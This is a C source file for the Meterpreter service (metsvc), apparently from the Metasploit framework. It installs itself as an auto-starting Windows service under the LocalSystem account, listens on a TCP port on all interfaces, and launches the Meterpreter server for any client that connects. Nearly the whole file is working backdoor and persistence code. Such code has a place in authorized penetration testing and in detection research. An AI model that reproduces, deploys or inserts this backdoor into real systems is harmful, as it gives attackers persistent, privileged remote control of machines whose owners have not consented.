/* Copyright (c) 2007, Determina Inc.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of Determina Inc. nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>

#include "metsvc.h"

//
// Globals
//

SERVICE_STATUS status;
SERVICE_STATUS_HANDLE hStatus;

//
// Listen for incoming connections and start the Meterpreter
//

int start_meterpreter()
{
    SOCKET sock = INVALID_SOCKET;
    DWORD err = 0;
    
    // Get the current module directory

    char path[MAX_PATH];
    char* p;
    
    if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
        err = GetLastError();
        printf("Cannot get module file name (0x%08x)\n", err);
        goto cleanup;
    }

    if ((p = strrchr(path, '\\')) == NULL) {
        err = -1;
        printf("Cannot find directory in module name %s (0x%08x)\n", path, err);
        goto cleanup;
    }

    *p = '\0';

    // Build the server filename

    if (sizeof(path) - strlen(path) < sizeof(METSVC_SERVER)+1) {
        err = -1;
        printf("Cannot build server filename (0x%08x)\n", err);
        goto cleanup;
    }
    
    strncat(path, "\\", 1);
    strncat(path, METSVC_SERVER, sizeof(METSVC_SERVER)-1);

    // Initialize Winsock

	WSADATA wsa_data;
    
	err = WSAStartup(MAKEWORD(2, 2), &wsa_data);
    if (err != 0) {
        printf("Cannot initialize Winsock (0x%08x)\n", err);
        goto cleanup;
    }

    // Create socket

    if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
        err = WSAGetLastError();
        printf("Cannot create socket (0x%08x)\n", err);
        goto cleanup;
    }

    // Bind to 0.0.0.0

    struct sockaddr_in sockaddr;

    sockaddr.sin_family      = AF_INET;
    sockaddr.sin_port        = htons(PORT);
    sockaddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sock, (struct sockaddr*)&sockaddr, sizeof(sockaddr)) == SOCKET_ERROR) {
        err = WSAGetLastError();
        printf("Cannot bind to port %d (0x%08x)\n", PORT, err);
        goto cleanup;
    }

    // Listen for incoming connections

    if (listen(sock, SOMAXCONN) == SOCKET_ERROR) {
        err = WSAGetLastError();
        printf("Cannot listen for incoming connections (0x%08x)\n", err);
        goto cleanup;
    }

    printf("Meterpreter service listening on port %d\n", PORT);
    fflush(stdout);

    // Accept incoming connections
   
    while (TRUE) {
    
        SOCKET conn;
        sockaddr_in peer;
        int peer_len = sizeof(peer);

        if ((conn = accept(sock, (struct sockaddr*)&peer, &peer_len)) == INVALID_SOCKET) {
            if ((err = WSAGetLastError()) == WSAECONNRESET)
                continue;
            printf("Cannot accept an incomming connection (0x%08x)\n", err);
            goto cleanup;
        }

        printf("Received connection from %s\n",
            inet_ntoa(peer.sin_addr));
        fflush(stdout);

        // Build the metsrv server command line

        char cmd[MAX_PATH];
        int len = _snprintf(cmd, sizeof(cmd), "\"%s\" %d", path, conn);

        if (len < 0 || len == sizeof(cmd)) {
            err = -1;
            printf("Cannot build the metsrv server command line (0x%08x)\n", err);
            goto cleanup;
        }
        
        // Start the metsrv server

        STARTUPINFO startup_info;
        PROCESS_INFORMATION process_information;

        ZeroMemory(&startup_info, sizeof(startup_info));
        startup_info.cb = sizeof(startup_info);

        ZeroMemory(&process_information, sizeof(process_information));

        if (CreateProcess(path, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL,
                          NULL, &startup_info, &process_information) == 0)
        {
            err = GetLastError();
            printf("Cannot start the metsrv server %s (0x%08x)\n", path, err);
            goto cleanup;
        }

        // Close our copy of the socket

        closesocket(conn);
    }

cleanup:

    // Cleanup
    
    if (sock != INVALID_SOCKET)
        closesocket(sock);
        
	return err;
}


//
// Process control requests from the Service Control Manager
//

VOID WINAPI ServiceCtrlHandler(DWORD fdwControl)
{
    switch (fdwControl) {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            status.dwCurrentState = SERVICE_STOPPED;
            break;

        default:
            break;
    }

    if (SetServiceStatus(hStatus, &status) == 0) {
        printf("Cannot set service status (0x%08x)\n", GetLastError());
        exit(1);
    }

    return;
}


//
// Main function of service
//

VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)
{
    // Register the service handler
    
    hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);

    if (hStatus == 0) {
        printf("Cannot register service handler (0x%08x)\n", GetLastError());
        exit(1);
    }

    // Initialize the service status structure

    status.dwServiceType = SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS;
    status.dwCurrentState = SERVICE_RUNNING;
    status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    status.dwWin32ExitCode = NO_ERROR;
    status.dwServiceSpecificExitCode = 0;
    status.dwCheckPoint = 0;
    status.dwWaitHint = 0;

    if (SetServiceStatus(hStatus, &status) == 0) {
        printf("Cannot set service status (0x%08x)\n", GetLastError());
        return;
    }

    // Start the Meterpreter

    DWORD err = start_meterpreter();

    if (err != 0) {
        status.dwCurrentState = SERVICE_STOPPED;
        status.dwWin32ExitCode = err;
        status.dwServiceSpecificExitCode = 0;

        if (SetServiceStatus(hStatus, &status) == 0) {
            printf("Cannot set service status (0x%08x)\n", GetLastError());
        }
    }

    return;
}


//
// Installs and starts the Meterpreter service
//

BOOL install_service()
{
    SC_HANDLE hSCManager;
    SC_HANDLE hService;

    char path[MAX_PATH];

    // Get the current module name

    if (!GetModuleFileName(NULL, path, MAX_PATH)) {
        printf("Cannot get module name (0x%08x)\n", GetLastError());
        return FALSE;
    }

    // Build the service command line

    char cmd[MAX_PATH];
    int len = _snprintf(cmd, sizeof(cmd), "\"%s\" service", path);

    if (len < 0 || len == sizeof(cmd)) {
        printf("Cannot build service command line (0x%08x)\n", -1);
        return FALSE;
    }

    // Open the service manager

    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);

    if (hSCManager == NULL) {
        printf("Cannot open service manager (0x%08x)\n", GetLastError());
        return FALSE;
    }

    printf(" * Installing service %s\n", SERVICE_NAME);
    fflush(stdout);

    // Create the service

    hService = CreateService(
        hSCManager,
        SERVICE_NAME,
        DISPLAY_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        cmd,
        NULL,
        NULL,
        NULL,
        NULL,   /* LocalSystem account */
        NULL
    );

    if (hService == NULL) {
        printf("Cannot create service (0x%08x)\n", GetLastError());

        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    // Start the service

    printf(" * Starting service\n");
    fflush(stdout);
    
    char* args[] = { path, "service" };

    if (StartService(hService, 2, (const char**)&args) == 0) {
        DWORD err = GetLastError();

        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            printf("Cannot start service %s (0x%08x)\n", SERVICE_NAME, err);

            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return FALSE;
        }
    }

    // Cleanup

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    printf("Service %s successfully installed.\n", SERVICE_NAME);
    fflush(stdout);
    
    return TRUE;
}


//
// Stops and removes the Meterpreter service
//

BOOL remove_service()
{
    SC_HANDLE hSCManager;
    SC_HANDLE hService;
    SERVICE_STATUS status;
    DWORD err;

    // Open the service manager

    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);

    if (hSCManager == NULL) {
        printf("Cannot open service manager (0x%08x)\n", GetLastError());
        return FALSE;
    }

    // Open the service

    hService = OpenService(hSCManager, SERVICE_NAME, SERVICE_STOP | DELETE);

    if (hService == NULL) {
        printf("Cannot open service %s (0x%08x)\n", SERVICE_NAME, GetLastError());

        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    // Stop the service

    printf(" * Stopping service %s\n", SERVICE_NAME);
    fflush(stdout);
    
    if (ControlService(hService, SERVICE_CONTROL_STOP, &status) == 0) {
        err = GetLastError();

        if (err != ERROR_SERVICE_NOT_ACTIVE) {
            printf("Cannot stop service %s (0x%08x)\n", SERVICE_NAME, err);

            CloseServiceHandle(hSCManager);
            return FALSE;
        }
    }

    // Delete the service

    printf(" * Removing service\n");
    fflush(stdout);
    
    if (DeleteService(hService) == 0) {
        printf("Cannot delete service %s (0x%08x)\n", SERVICE_NAME);
        
        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    // Cleanup

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    printf("Service %s successfully removed.\n", SERVICE_NAME);
    fflush(stdout);

    return TRUE;
}


//
// Start the service
//

void start_service()
{
    SERVICE_TABLE_ENTRY ServiceTable[] =
    {
        { SERVICE_NAME, &ServiceMain },
        { NULL, NULL }
    };

    if (StartServiceCtrlDispatcher(ServiceTable) == 0) {
        printf("Cannot start the service control dispatcher (0x%08x)\n",
            GetLastError());
        exit(1);
    }
}


//
// Main function
//

int main(int argc, char *argv[])
{
    if (argc == 2) {

        if (strcmp(argv[1], "install-service") == 0) {

            // Installs and starts the service

            install_service();
            return 0;
        }
        else if (strcmp(argv[1], "remove-service") == 0) {
        
            // Stops and removes the service
            
            remove_service();
            return 0;
        }
        else if (strcmp(argv[1], "service") == 0) {
        
            // Starts the Meterpreter as a service

            start_service();
            return 0;
        }
    }

    // Starts the Meterpreter as a normal application

    start_meterpreter();

    return 0;
}
